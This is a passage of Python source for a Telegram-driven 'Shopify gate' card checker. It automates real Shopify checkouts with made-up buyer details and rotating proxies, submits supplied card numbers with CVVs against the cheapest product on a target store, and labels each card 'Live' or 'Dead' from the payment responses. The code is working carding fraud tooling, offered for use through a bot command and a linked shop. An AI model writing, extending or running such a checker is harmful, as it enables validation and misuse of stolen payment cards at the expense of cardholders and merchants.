            post_plain('https://deposit.shopifycs.com/sessions', body,
                       headers=['Content-Type: application/json'], proxy=self.proxy),
        )
        token = ''
        for resp in tokens:
            try:
                data = json.loads(resp)
            except Exception:
                data = {}
            token = data.get('id', '') or ''
            if token:
                break
        if not token:
            raise RuntimeError('Error getting cc token')
        return token

    # -- step: proposal ---------------------------------------------------
    def send_proposal(self, client: Curl, extractor: CheckoutData, headers: list, site: str,
                      proposal_payload: dict) -> dict:
        payload = json.dumps(proposal_payload)
        retries = 0
        while True:
            resp = client.post(f'{site}/checkouts/internal/graphql/persisted?operationName=Proposal',
                               payload, headers=headers)
            try:
                decoded = json.loads(resp)
            except Exception:
                decoded = {}
            errors = (decoded.get('data', {}).get('session', {}).get('negotiate', {}).get('errors')) or []
            has_out_of_stock = has_currency_mismatch = has_required_artifacts = should_retry = False
            if errors:
                for p_err in errors:
                    code = p_err.get('code', '')
                    if code in ('DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
                                'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE', 'PAYMENTS_METHOD'):
                        raise RuntimeError(f'Proposal error: {code} (not retryable)')
                    if code == 'MERCHANDISE_OUT_OF_STOCK':
                        has_out_of_stock = True
                    if code == 'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH':
                        has_currency_mismatch = True
                    if code == 'REQUIRED_ARTIFACTS_UNAVAILABLE':
                        has_required_artifacts = True
                    if code == 'VALIDATION_CUSTOM':
                        self.bad_products.append(self.external_product.get('variant', {}).get('id') if self.external_product else None or self.current_variant_id)
                        raise RuntimeError('Proposal error: VALIDATION_CUSTOM (retryable)')
                    if code == 'WAITING_PENDING_TERMS':
                        should_retry = True
                if has_currency_mismatch:
                    correct_currency = 'USD'
                    m = re.search(r'"presentmentCurrency":"([A-Z]{3})"', resp)
                    if m:
                        correct_currency = m.group(1)
                    self.force_currency = correct_currency
                    raise RuntimeError(f'Proposal error: BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH to {correct_currency} (retryable)')
                if has_out_of_stock:
                    self.bad_products.append(self.external_product.get('variant', {}).get('id') if self.external_product else None or self.current_variant_id)
                    if len(self.bad_products) >= 2:
                        raise RuntimeError('MERCHANDISE_OUT_OF_STOCK (fatal)')
                    raise RuntimeError('Proposal error: MERCHANDISE_OUT_OF_STOCK (retryable)')
                if should_retry:
                    if retries < 3:
                        retries += 1
                        time.sleep(2)
                        continue
                    raise RuntimeError('Proposal error: WAITING_PENDING_TERMS (max retries reached)')
                if has_required_artifacts:
                    raise RuntimeError('Proposal error: REQUIRED_ARTIFACTS_UNAVAILABLE (not retryable)')
            seller_proposal = decoded.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal')
            if not seller_proposal:
                raise RuntimeError('SellerProposal not found.')
            return seller_proposal

    # -- step: submit -----------------------------------------------------
    def send_submit(self, client: Curl, site: str, headers: list, payload: str,
                    first_name: str, last_name: str, domain: str) -> str:
        cc_retry_done = False
        try:
            cc_token = json.loads(payload)['variables']['input']['payment']['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId']
        except Exception:
            cc_token = ''
        while True:
            resp = client.post(f'{site}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion',
                               payload, headers=headers)
            try:
                data = json.loads(resp)
            except Exception:
                data = {}
            receipt_id = data.get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('id', '')
            if data.get('errors'):
                raise RuntimeError('Submit error: Gate not supported')
            if not receipt_id and not cc_retry_done:
                submit_errors = data.get('data', {}).get('submitForCompletion', {}).get('errors', [])
                has_out_of_stock = has_currency_mismatch = False
                for err in submit_errors:
                    code = err.get('code', '')
                    if code == 'MERCHANDISE_OUT_OF_STOCK':
                        has_out_of_stock = True
                    if code == 'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH':
                        has_currency_mismatch = True
                    if code == 'TAX_NEW_TAX_MUST_BE_ACCEPTED':
                        raise RuntimeError('Submit error: TAX_NEW_TAX_MUST_BE_ACCEPTED (retryable)')
                    if code == 'VALIDATION_CUSTOM':
                        self.bad_products.append(self.external_product.get('variant', {}).get('id') if self.external_product else None or self.current_variant_id)
                        raise RuntimeError('Submit error: VALIDATION_CUSTOM (retryable)')
                    if code == 'PAYMENTS_CREDIT_CARD_SESSION_ID':
                        cc_retry_done = True
                        new_token = self.get_cc_token(client, first_name, last_name, domain)
                        if new_token:
                            payload = payload.replace(f'"sessionId":"{cc_token}"', f'"sessionId":"{new_token}"')
                            payload = payload.replace(f'"sessionId": "{cc_token}"', f'"sessionId": "{new_token}"')
                            continue
                if has_out_of_stock:
                    self.bad_products.append(self.external_product.get('variant', {}).get('id') if self.external_product else None or self.current_variant_id)
                    if len(self.bad_products) >= 2:
                        raise RuntimeError('MERCHANDISE_OUT_OF_STOCK (fatal)')
                    raise RuntimeError('Submit error: MERCHANDISE_OUT_OF_STOCK (retryable)')
                if has_currency_mismatch:
                    correct_currency = 'USD'
                    m = re.search(r'"presentmentCurrency":"([A-Z]{3})"', resp)
                    if m:
                        correct_currency = m.group(1)
                    self.force_currency = correct_currency
                    raise RuntimeError(f'Submit error: BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH to {correct_currency} (retryable)')
            if not receipt_id:
                submit_errors = data.get('data', {}).get('submitForCompletion', {}).get('errors', [])
                if submit_errors:
                    codes = [e.get('code', '') for e in submit_errors]
                    first_code = codes[0] if codes else ''
                    card_errors = ['GENERIC_ERROR', 'INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_CVV',
                                   'INVALID_CVC', 'CARD_DECLINED', 'DO_NOT_HONOR', 'STOLEN_CARD', 'EXPIRED_CARD']
                    if first_code in card_errors:
                        raise RuntimeError(f'Card error: {first_code}')
                    raise RuntimeError(f'Submit rejected: {first_code}')
                raise RuntimeError('Receipt ID not found.')
            return receipt_id

    # -- step: poll -------------------------------------------------------
    @staticmethod
    def poll_receipt(client: Curl, site: str, headers: list, receipt_id: str, session_token: str,
                     poll_query_id: str) -> str:
        variables = json.dumps({'receiptId': receipt_id, 'sessionToken': session_token})
        poll_url = (f'{site}/checkouts/internal/graphql/persisted'
                    f'?operationName=PollForReceipt&variables={quote(variables)}&id={poll_query_id}')
        retries = 0
        while True:
            time.sleep(2)
            retries += 1
            if retries > 3:
                raise RuntimeError('Max retries reached')
            resp = client.get(poll_url, headers=headers)
            if ('"__typename":"ProcessingReceipt"' not in resp and
                    '"__typename":"WaitingReceipt"' not in resp):
                return resp

    # -- step: classify ---------------------------------------------------
    def classify_result(self, body: str, data_response: dict, min_price: str) -> str:
        if any(k in body for k in ('/thank_you', '/post_purchase', 'Your order is confirmed', 'Thank you',
                                   'ThankYou', 'thank_you', 'success', 'classicThankYouPageUrl',
                                   '"__typename":"ProcessedReceipt"', 'SUCCESS')):
            return f'Live: Charged successfully [{min_price}] - [{self.global_tries}/{self.global_max_tries}]'
        if 'INSUFFICIENT_FUNDS' in body:
            return f'Live: INSUFFICIENT_FUNDS [{self.global_tries}/{self.global_max_tries}]'
        if any(k in body for k in ('INCORRECT_CVC', 'INCORRECT_CVV', 'INVALID_CVC')):
            return f'Live: INCORRECT_CVC [{self.global_tries}/{self.global_max_tries}]'
        if '/stripe/authentications/' in body or 'CompletePaymentChallenge' in body:
            return f'Dead: 3D [{self.global_tries}/{self.global_max_tries}]'
        err = data_response.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
        if err:
            return f'Dead: {err} - [{self.global_tries}/{self.global_max_tries}]'
        return f'Error: Response Not Found - [{self.global_tries}/{self.global_max_tries}]'

    # -- main flow --------------------------------------------------------
    def checkout(self) -> str:
        client = Curl(proxy=self.proxy)
        site = self.site

        # Detect country from TLD
        host = site.split('://')[-1].split('/')[0]
        domain = host
        tld = host.rsplit('.', 1)[-1].lower() if '.' in host else ''
        country_code = {'ca': 'CA', 'uk': 'UK', 'au': 'AU'}.get(tld, 'US')

        if self.external_address:
            address = self.external_address.get('street', '')
            city_us = self.external_address.get('city', '')
            state_us = self.external_address.get('state', '')
            zip_us = self.external_address.get('zip', '')
            country_code = 'US'
            phone = self.external_address.get('phone') or _phone('US')
            parts = address.split(' ', 1)
            num_us, address_us = (parts[0], parts[1]) if len(parts) > 1 else (parts[0], '')
        else:
            random_address = _random_address(country_code)
            num_us = random_address['num']
            address_us = random_address['address1']
            address = random_address['address']
            city_us = random_address['city']
            state_us = random_address['state']
            zip_us = random_address['zip']
            phone = _phone(country_code)

        first_name = _fn()
        last_name = _ln()
        email = self.external_email or _email(first_name, last_name)
        ua = _ua()
        _log(f'COUNTRY: {country_code} | ADDR: {address}, {city_us}, {state_us}, {zip_us}')

        while True:
            try:
                # 1. geocode
                geo = _geocode(client, num_us, address_us, city_us)
                lat, lon = geo['lat'], geo['lon']

                # 2. validate site
                if not re.match(r'^https?://', site):
                    raise RuntimeError('Invalid site URL.')
                parsed = site.split('://')
                site = f'{parsed[0]}://{parsed[1].split("/")[0]}'

                # 3. product
                product = None
                if self.external_product:
                    product = {'id': self.external_product['variant']['id'],
                               'price': self.external_product['variant']['price'],
                               'title': self.external_product.get('title', '')}
                else:
                    try:
                        resp = client.get(f'{site}/products.json')
                        data = json.loads(resp)
                    except json.JSONDecodeError:
                        data = {'products': []}
                    product = self.get_minimum_price_product_details(data, self.bad_products)
                min_price_product_id = product['id']
                self.current_variant_id = min_price_product_id
                min_price = product['price']
                product_title = product['title']
                _log(f'PRODUCT OK - id:{min_price_product_id} price:{min_price} title:{product_title}')

                # 4. add to cart
                checkout_html = client.get(f'{site}/cart/{min_price_product_id}:1')
                _log(f'CART ADD OK - html:{len(checkout_html)}bytes')

                # 5. extract data
                extractor = CheckoutData(checkout_html)
                session_token = CheckoutData.meta(checkout_html, 'serialized-sessionToken')
                checkout_token = CheckoutData.meta(checkout_html, 'serialized-sourceToken')
                queue_token = extractor.get_queue_token()
                currency = extractor.get_currency()
                payment_method_identifier = extractor.get_payment_method_identifier()

                if self.force_currency:
                    currency = self.force_currency
                extractor.set_currency(currency)
                _log('EXTRACTING OPS...')
                operation_ids = self.extract_operation_ids(checkout_html, client)
                proposal_query_id = operation_ids['proposal']
                submit_query_id = operation_ids['submitForCompletion']
                poll_query_id = operation_ids['pollForReceipt']

                if not session_token or not queue_token or not checkout_token or not payment_method_identifier:
                    raise RuntimeError('Error getting tokens')

                web_build_id = _get_string(checkout_html, 'Sha&quot;:&quot;', '&quot;,&quot;')
                if not web_build_id:
                    raise RuntimeError('Error getting web build ID')
                _log(f'TOKENS OK - currency:{currency} build:{web_build_id}')

                # 6. address
                address_data = {'address': address, 'city': city_us, 'state': state_us, 'zip': zip_us,
                                'countryCode': country_code, 'phone': phone,
                                'firstName': first_name, 'lastName': last_name, 'lat': lat, 'lon': lon}

                headers = [
                    f'content-type: application/json',
                    f'origin: {site}',
                    f'x-checkout-one-session-token: {session_token}',
                    f'x-checkout-web-build-id: {web_build_id}',
                    'x-checkout-web-deploy-stage: production',
                    'x-checkout-web-server-handling: fast',
                    'x-checkout-web-server-rendering: no',
                    f'x-checkout-web-source-id: {checkout_token}',
                    f'User-Agent: {ua}',
                ]

                # 7. proposal
                proposal_payload = extractor.build_proposal_payload(session_token, queue_token, address_data,
                                                                    email, proposal_query_id)
                seller_proposal = self.send_proposal(client, extractor, headers, site, proposal_payload)
                extractor.update_from_proposal_response(seller_proposal)

                # 8. submit data
                handle = extractor.get_delivery_handle()
                delamount = extractor.get_delivery_amount()
                tax = extractor.get_tax_amount()
                currency_code = extractor.get_tax_currency()
                total_amount = extractor.get_total_amount()
                is_shipping = extractor.is_shipping_required()
                stable_ids = extractor.get_stable_ids()
                stable_id = stable_ids[0] if stable_ids else ''
                if not handle:
                    raise RuntimeError('Delivery handle not found.')
                _log(f'PROPOSAL OK - shipping:{"yes" if is_shipping else "no"} handle:{handle or "none"} ship:{delamount} tax:{tax} total:{total_amount}')

                # 9. cc token right before submit
                cc_token = self.get_cc_token(client, first_name, last_name, domain)

                # 10. submit
                submit_payload = extractor.build_submit_payload(
                    session_token, queue_token, handle, delamount, tax, total_amount, currency_code,
                    cc_token, payment_method_identifier, checkout_token, stable_id, submit_query_id,
                    site, self.cc[:6], address_data, email)
                receipt_id = self.send_submit(client, site, headers, json.dumps(submit_payload),
                                              first_name, last_name, domain)

                # 11. poll
                poll_body = self.poll_receipt(client, site, headers, receipt_id, session_token, poll_query_id)
                try:
                    poll_data = json.loads(poll_body)
                except Exception:
                    poll_data = {}

                # 12. classify
                return self.classify_result(poll_body, poll_data, str(min_price))
            except Exception as e:
                _log(f'EXCEPTION: {e} (try {self.global_tries}/{self.global_max_tries})')
                msg = str(e)
                if 'MERCHANDISE_OUT_OF_STOCK (fatal)' in msg:
                    return f'Dead: no hay stock de ese producto - [{self.global_tries}/{self.global_max_tries}]'
                if 'not retryable' in msg or 'Receipt ID not found' in msg:
                    return f'Error: {msg}'
                if 'No products found' in msg:
                    return f'Dead: no hay stock de ese producto - [{self.global_tries}/{self.global_max_tries}]'
                if 'Card error:' in msg:
                    return f'Dead: {msg.replace("Card error:", "").strip()} - [{self.global_tries}/{self.global_max_tries}]'
                if 'Submit rejected:' in msg:
                    return f'Error: {msg}'
                self.global_tries += 1
                if self.global_tries >= self.global_max_tries:
                    if 'MERCHANDISE_OUT_OF_STOCK' in msg:
                        return f'Dead: no hay stock de ese producto - [{self.global_tries}/{self.global_max_tries}]'
                    return f'Error: {msg} - Max retries reached.'
                if self.proxy:
                    self.proxy = random.choice(load_proxies()) if load_proxies() else self.proxy
                    client = Curl(proxy=self.proxy)


# ── Public contract (API + Telegram) ────────────────────────────────────
def _port_result(raw: str) -> str:
    return raw or 'Error: sin respuesta'


def _checker(cc, bin_data, site: str, address: dict = None, email: str = None,
             product: dict = None, proxy: dict = None) -> dict:
    """Run one checkout; returns the API-normalized dict."""
    try:
        num, mes, ano, cvv = cc[0], cc[1], cc[2], cc[3]
        mes = mes.zfill(2)
        ano = f'20{ano}' if len(ano) <= 2 else ano
        checkout = ShopifyCheckout(site=site, proxy=proxy, cc=num, mes=mes, ano=ano, cvv=cvv,
                                   address=address, email=email, product=product)
        raw = checkout.checkout()
        _log(f'RESULT: {raw[:120]}', num)
        if raw.startswith('Live:') or raw.startswith('Live '):
            return {'status': 'Approved ✅', 'success': True, 'response': raw}
        if raw.startswith('Dead:'):
            return {'status': 'Declined ❌', 'success': False, 'response': raw}
        return {'status': 'Error ⚠️', 'success': False, 'response': raw}
    except Exception as e:
        return {'status': 'Error ⚠️', 'success': False, 'response': str(e)[:300]}


def run_check(cc, bin_data, ctx=None):
    """API gate contract: run_check(cc, bin_data, ctx)."""
    ctx = ctx or {}
    site = ctx.get('website') or ctx.get('site') or ctx.get('url') or ''
    if not site:
        return {'status': 'Error ⚠️', 'response': 'Shopify gate requires a website parameter'}
    proxy = None
    raw_proxy = ctx.get('proxy') or ''
    if raw_proxy:
        proxy = _parse_proxy_line(raw_proxy) or {'method': 'custom', 'server': raw_proxy}
    elif load_proxies():
        proxy = random.choice(load_proxies())
    return _checker(cc, bin_data, site,
                    address=ctx.get('address'), email=ctx.get('email'),
                    product=ctx.get('product'), proxy=proxy)


# ── Telegram command (mirrors telcel-style gateCmd) ─────────────────────
def gateCmd(bot, update, gestion):
    import time as _t
    import threading
    user = gestion.view(user_id=update.user_id)
    chat = gestion.view(user_id=update.chat_id)
    cmd = gestion.viewCmd(bot.cmd.command)
    bot.sendAction(action='typing')
    raw = bot.cmd.args if len(bot.cmd.args) > 0 else (update.reply_to.text if update.reply_to is not None else '')

    if not raw:
        return bot.replyMessage(text=(
            f"{bot.bi('Shopify Gate')} [ 🛒 ]\n{DIV}\n"
            f"🛒 {bot.bi('Use')}: <code>/sfy cc|mm|yy|cvv https://tienda.com</code>\n{DIV}\n"
            f"🛒 {bot.bi('Ejemplo')}: <code>/sfy 4111111111111111|12|26|123 https://demo.shopify.com</code>"
        ))

    parts = raw.strip().split()
    card_s = parts[0] if parts else ''
    site = parts[1] if len(parts) > 1 else ''
    if not card_s or not site.startswith('http'):
        return bot.replyMessage(text=(
            f"{bot.bi('Wrong Data')} [ ⚠️ ]\n"
            f"🍸 {bot.bi('Raise')}: <code>Use: /sfy cc|mm|yy|cvv https://tienda.com</code>"
        ))

    b = gestion.gates(user=user, chat=chat, text=card_s, cmd=cmd, bot=bot)
    if not b['status']:
        return bot.replyMessage(text=b['text'])

    cc, binData = b['cc'], b['bin']
    now = _t.time()
    edit = bot.replyMessage(text=getattr(bot, 'bi', lambda x: x)('<i>Procesando Shopify…</i>'))
    stop, th = threading.Event(), None

    def _spin():
        pcts = [15, 30, 45, 60, 75, 90]
        while not stop.is_set():
            try:
                bar = '▰' * (pcts[0] // 10) + '▱' * (10 - pcts[0] // 10)
                bot.editMessage(message_id=edit.message_id, text=f'<code>{bar} {pcts[0]}%</code>')
            except Exception:
                pass
            stop.wait(1.2)
    th = threading.Thread(target=_spin, daemon=True)
    th.start()

    try:
        result = run_check(cc, binData, {'website': site})
    except Exception as e:
        result = {'status': 'Error ⚠️', 'response': str(e)[:300]}
    finally:
        stop.set()
        if th is not None:
            th.join(timeout=2)

    mid = edit.message_id if edit is not None else None
    status = result.get('status', 'Error ⚠️')
    card = (
        f"🛒 {bot.bi('Shopify')} [ 🛒 ]\n{DIV}\n"
        f"💳 {bot.bi('Card')}: <code>{cc[0]}|{cc[1]}|{cc[2]}|{cc[3]}</code>\n"
        f"⚡ {bot.bi('Status')}: <code>{status}</code>\n"
        f"💳 {bot.bi('Gate')}: <code>{_GATEWAY}</code>\n"
        f"🌐 {bot.bi('Site')}: <code>{site[:60]}</code>\n"
        f"🍸 {bot.bi('Response')}: <code>{_html_escape(result.get('response', ''))}</code>\n{DIV}\n"
        f"⚡ {bot.bi('T. Taken')}: <code>{round(_t.time() - now, 1)}'s</code>\n"
        f"👤 {bot.bi('User')}: {update.username}\n{DIV}"
    )
    bot.editMessage(message_id=mid, text=card) if mid else bot.replyMessage(text=card)


def _html_escape(s: str) -> str:
    return str(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')


# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════